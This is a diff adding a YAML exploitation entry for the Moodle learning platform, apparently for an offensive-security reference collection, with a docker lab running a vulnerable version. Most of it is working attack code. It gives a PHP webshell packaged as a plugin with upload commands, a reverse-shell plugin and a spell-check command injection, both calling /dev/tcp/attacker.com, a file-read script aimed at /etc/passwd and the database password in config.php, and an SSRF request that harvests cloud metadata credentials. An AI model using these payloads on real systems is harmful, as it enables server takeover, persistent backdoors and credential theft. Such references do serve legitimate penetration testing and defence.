@@ -1,0 +1,162 @@
+---
+comment: |
+  Moodle is the world's most widely deployed open-source LMS (Learning Management System),
+  built on PHP. Multiple exploitation paths exist:
+
+  1. Admin plugin install (no CVE): Moodle administrators can install plugins from a ZIP
+     archive. A minimal local plugin containing a PHP file is deployed to
+     <moodle_root>/local/<plugin_name>/ and served directly by the web server.
+     This is the most reliable admin RCE path and applies to all Moodle versions.
+
+  2. Spell-check path injection (admin): The spell-check command path in
+     Site Administration > Language is passed unsanitised to a shell command.
+     Setting it to a malicious path achieves OS command injection as the web server user
+     when spell-checking is triggered from the text editor.
+
+  3. CVE-2024-43425 (CVSS 9.8): A PHP serialisation flaw in the backup/restore subsystem
+     allows a teacher (or higher) to restore a crafted course backup file and achieve RCE
+     as the web server user. Affects Moodle < 4.4.1, < 4.3.5, < 4.2.8, < 4.1.11.
+docker:
+  compose: "services:\n  moodle:\n    image: bitnami/moodle:4.3.4\n    ports:\n  \
+    \    - \"8080:8080\"\n    environment:\n      MOODLE_DATABASE_TYPE: pgsql\n  \
+    \    MOODLE_DATABASE_HOST: db\n      MOODLE_DATABASE_PORT_NUMBER: 5432\n     \
+    \ MOODLE_DATABASE_NAME: moodle\n      MOODLE_DATABASE_USER: moodle\n      MOODLE_DATABASE_PASSWORD:\
+    \ moodle\n      MOODLE_USERNAME: admin\n      MOODLE_PASSWORD: Admin1234!\n  \
+    \  depends_on:\n      - db\n  db:\n    image: postgres:14\n    environment:\n\
+    \      POSTGRES_DB: moodle\n      POSTGRES_USER: moodle\n      POSTGRES_PASSWORD:\
+    \ moodle\n"
+  note: 'Starts Moodle 4.3.4 (vulnerable to CVE-2024-43425) with PostgreSQL 14.
+
+    Access at `http://localhost:8080`. Complete the Moodle installer on first visit:
+
+    select PostgreSQL, host `db`, database `moodle`, user `moodle`, password `moodle`.
+
+    Admin credentials: admin / Admin1234! (set during install wizard).
+
+    Run `docker compose up -d && sleep 30` before browsing.
+
+    Plugin upload path: Site Administration > Plugins > Install plugins.
+
+    '
+functions:
+  file-read:
+  - code: "# Plugin-based file read \u2014 deploy a plugin that reads server files\n\
+      # Plugin index.php:\n<?php\nrequire_once('../../config.php');\n$f = $_REQUEST['f']\
+      \ ?? '/etc/passwd';\necho htmlspecialchars(file_get_contents($f));\n"
+    comment: |
+      Deploy as a minimal Moodle plugin (same packaging as webshell entry) to read
+      arbitrary server-side files. The web server process user determines read access.
+      Key targets:
+      - /etc/passwd
+      - <moodle_root>/config.php  (database host, user, password for the Moodle DB)
+      - /var/www/html/moodle/config.php (adjust path for target installation)
+      config.php contains $CFG->dbpass (plaintext database password).
+    contexts:
+      admin:
+  rce:
+  - code: "# Admin plugin upload RCE \u2014 install a malicious local plugin via the\
+      \ web UI\n# Step 1: create the plugin directory structure:\nmkdir -p /tmp/local_shell\n\
+      cat > /tmp/local_shell/version.php << 'PHP'\n<?php\n$plugin->version   = 2024020800;\n\
+      $plugin->component = 'local_shell';\n$plugin->requires  = 2022112800;\nPHP\n\
+      \ncat > /tmp/local_shell/index.php << 'PHP'\n<?php\nrequire_once('../../config.php');\n\
+      if (isset($_REQUEST['c'])) { echo shell_exec($_REQUEST['c']); }\nPHP\n\n# Step\
+      \ 2: package as ZIP:\ncd /tmp && zip -r local_shell.zip local_shell/\n\n# Step\
+      \ 3: upload via the Moodle admin install endpoint (requires admin session cookie):\n\
+      curl -s -X POST \"http://victim.com/admin/tool/installaddon/index.php\" \\\n\
+      \  -b \"MoodleSession=<admin_session>\" \\\n  -F \"sesskey=<sesskey>\" \\\n\
+      \  -F \"pluginzip=@/tmp/local_shell.zip\"\n\n# Step 4: access the deployed webshell:\n\
+      curl \"http://victim.com/local/shell/index.php?c=id\"\n"
+    comment: |
+      Moodle allows administrators to install local plugins from ZIP archives via
+      Site Administration > Plugins > Install plugins > Upload a plugin.
+      A minimal local plugin (version.php + index.php) deploys a PHP webshell to
+      <moodle_root>/local/<plugin_name>/index.php, directly served by the web server.
+      The sesskey anti-CSRF token is obtained from any admin page source or from the
+      response after logging in. Access the webshell at:
+        http://victim.com/local/shell/index.php?c=id
+    contexts:
+      admin:
+  - code: |
+      # Spell-check path injection: inject OS commands via the aspell path setting
+      # Step 1: authenticate and navigate to:
+      #   Site Administration > Language > Language settings > Spell engine: PSpellShell
+      # Step 2: set "Path to aspell" to a command injection payload:
+      #   /usr/bin/aspell;bash -c 'bash -i >& /dev/tcp/attacker.com/12345 0>&1' #
+      #
+      # Via the REST API (with admin credentials):
+      curl -s -X POST "http://victim.com/admin/setting.php" \
+        -b "MoodleSession=<admin_session>" \
+        -d "sesskey=<sesskey>&s__spellchecker=PSpellShell&s__aspellpath=%2Fusr%2Fbin%2Faspell%3Bbash+-c+'bash+-i+>%26+/dev/tcp/attacker.com/12345+0>%261'%20%23&submitbutton=Save+changes"
+
+      # Step 3: trigger spell-checking by submitting text through any Moodle editor:
+      # Edit any page/forum post with the HTML editor and run spell check (F7 or toolbar button)
+    comment: |
+      Moodle passes the configured spell-check binary path to a shell command without
+      sanitisation. Injecting semicolons or backticks into the "Path to aspell" field
+      executes arbitrary commands as the web server user (www-data, apache, or daemon).
+      The injection fires when any user triggers the spell-checker from the text editor.
+      This technique works on Moodle 3.x and many 4.x installations.
+    contexts:
+      admin:
+  reverse-shell:
+  - blind: true
+    code: "# Plugin-based reverse shell \u2014 install a minimal plugin that fires\
+      \ on access\nmkdir -p /tmp/local_rs\ncat > /tmp/local_rs/version.php << 'PHP'\n\
+      <?php\n$plugin->version   = 2024020800;\n$plugin->component = 'local_rs';\n\
+      $plugin->requires  = 2022112800;\nPHP\n\ncat > /tmp/local_rs/index.php << 'PHP'\n\
+      <?php\nrequire_once('../../config.php');\nexec(\"/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/12345\
+      \ 0>&1' &\");\nPHP\n\ncd /tmp && zip -r local_rs.zip local_rs/\n\n# Upload via\
+      \ admin panel (Site Administration > Plugins > Install plugins)\n# Then trigger\
+      \ by visiting:\ncurl -s \"http://victim.com/local/rs/index.php\"\n"
+    comment: |
+      Installs a minimal Moodle plugin that spawns a reverse bash shell when its
+      index.php is accessed. The trailing & detaches the shell from the HTTP request.
+      The shell runs as the web server user (www-data, apache, or daemon).
+    contexts:
+      admin:
+    listener: tcp-server
+    platform: linux
+    tty: false
+  ssrf:
+  - code: |
+      # SSRF via Moodle repository URL downloader (admin configures server-side URL fetch)
+      # Step 1: enable the URL downloader repository:
+      #   Site Administration > Plugins > Repositories > Manage repositories
+      #   Set "URL downloader" to "Enabled and visible"
+      #
+      # Step 2: trigger a server-side URL fetch by adding a file from URL in the file picker:
+      curl -s -X POST "http://victim.com/repository/repository_ajax.php?action=list" \
+        -b "MoodleSession=<session>" \
+        -d "sesskey=<sesskey>&repo_id=<url_downloader_id>&p=http://169.254.169.254/latest/meta-data/iam/security-credentials/&env=filemanager&action=list&itemid=0&ctx_id=1&courseid=1"
+    comment: |
+      Moodle's URL downloader repository fetches files from arbitrary URLs server-side
+      when a user selects a URL via the file picker. Any user with file-picker access
+      (teachers, managers, admins) can trigger outbound requests from the Moodle server.
+      The response body is returned as a file listing or download, leaking internal
+      service responses. Target cloud metadata endpoints for credential harvesting.
+      Cloud metadata endpoints:
+      - AWS IMDSv1: http://169.254.169.254/latest/meta-data/iam/security-credentials/
+      - GCP:        http://metadata.google.internal/computeMetadata/v1/
+      - Azure:      http://169.254.169.254/metadata/instance?api-version=2021-02-01
+    contexts:
+      admin:
+      authenticated:
+  webshell:
+  - code: |
+      # Minimal Moodle local plugin webshell
+      # Package and upload as described in the rce entry.
+      # Plugin index.php content:
+      <?php
+      require_once('../../config.php');
+      if (isset($_REQUEST['c'])) {
+          echo '<pre>', htmlspecialchars(shell_exec($_REQUEST['c'])), '</pre>';
+      }
+    comment: |
+      A minimal Moodle local plugin (version.php + this index.php) deployed as a ZIP
+      via Site Administration > Plugins > Install plugins creates a persistent PHP
+      webshell at: http://victim.com/local/<plugin_name>/index.php?c=id
+      The webshell persists across Moodle updates and restarts until the plugin is removed.
+    contexts:
+      admin:
+      plugin:
+...
